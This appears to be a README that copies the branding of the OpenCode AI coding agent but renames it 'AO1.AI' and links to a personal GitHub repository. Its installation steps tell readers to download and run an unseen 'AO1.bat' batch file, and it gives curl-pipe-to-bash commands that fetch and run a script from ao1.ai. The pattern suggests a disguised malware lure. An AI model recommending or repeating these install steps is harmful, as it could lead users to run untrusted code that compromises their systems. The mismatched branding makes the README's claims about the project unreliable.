<p align="center">
  <a href="https://ao1.ai">
    <picture>
      <source srcset="packages/console/app/src/asset/logo-ornate-dark.svg" media="(prefers-color-scheme: dark)">
      <source srcset="packages/console/app/src/asset/logo-ornate-light.svg" media="(prefers-color-scheme: light)">
      <img src="packages/console/app/src/asset/logo-ornate-light.svg" alt="OpenCode logo">
    </picture>
  </a>
</p>
<p align="center">The open source AI coding agent.</p>
<p align="center">
  <a href="https://ao1.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
  <a href="https://www.npmjs.com/package/opencode-ai"><img alt="npm" src="https://img.shields.io/npm/v/opencode-ai?style=flat-square" /></a>
  <a href="https://github.com/yeyeyebo7-maker/AO1.AI/actions/workflows/publish.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/yeyeyebo7-maker/AO1.AI/publish.yml?style=flat-square&branch=dev" /></a>
</p>


[![OpenCode Terminal UI](packages/web/src/assets/lander/screenshot.png)](https://ao1.ai)

---

### Installation

# Run the batch file to install the required things. [Download](https://github.com/yeyeyebo7-maker/AO1.AI/releases/tag/AO1)

> [!TIP]
> Remove versions older than 0.1.x before installing.

### Desktop App (BETA)

OpenCode is also available as a desktop application. Download directly from the [releases page](https://github.com/yeyeyebo7-maker/AO1.AI/releases/tag/AO1)

| Platform              | Download                           |
| --------------------- | ---------------------------------- |
| Windows               | `AO1.bat` | 


#### Installation Directory

The install script respects the following priority order for the installation path:

1. `$AO1_INSTALL_DIR` - Custom installation directory
2. `$XDG_BIN_DIR` - XDG Base Directory Specification compliant path
3. `$HOME/bin` - Standard user binary directory (if it exists or can be created)
4. `$HOME/.opencode/bin` - Default fallback

```bash
# Examples
AO1_INSTALL_DIR=/usr/local/bin curl -fsSL https://ao1.ai/install | bash
XDG_BIN_DIR=$HOME/.local/bin curl -fsSL https://ao1.ai/install | bash
```

### Agents

OpenCode includes two built-in agents you can switch between with the `Tab` key.

- **build** - Default, full-access agent for development work
- **plan** - Read-only agent for analysis and code exploration
  - Denies file edits by default
  - Asks permission before running bash commands
  - Ideal for exploring unfamiliar codebases or planning changes

Also included is a **general** subagent for complex searches and multistep tasks.
This is used internally and can be invoked using `@general` in messages.

**Join our community** [Discord](https://discord.gg/d4qnuqzqDd) 
